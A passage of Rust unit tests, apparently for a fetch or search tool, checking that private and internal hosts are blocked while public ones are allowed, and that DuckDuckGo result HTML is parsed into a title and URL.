        assert!(host_blocked("192.168.0.1"));
        assert!(host_blocked("172.16.5.5"));
        assert!(host_blocked("100.64.0.1")); // CGNAT
        assert!(host_blocked("[::1]"));
        assert!(host_blocked("db.internal"));
        assert!(host_blocked("printer.local"));
        // Public hosts → allowed.
        assert!(!host_blocked("example.com"));
        assert!(!host_blocked("8.8.8.8"));
        assert!(!host_blocked("140.82.112.3"));
    }

    #[test]
    fn parse_ddg_extracts_results() {
        let html = r#"<a class="result__a" href="//duckduckgo.com/l/?uddg=https%3A%2F%2Frust-lang.org">Rust Lang</a><a class="result__snippet" href="x">The Rust programming language</a>"#;
        let r = parse_ddg(html, 8);
        assert_eq!(r.len(), 1);
        assert_eq!(r[0].0, "Rust Lang");
        assert_eq!(r[0].1, "https://rust-lang.org");
    }
}
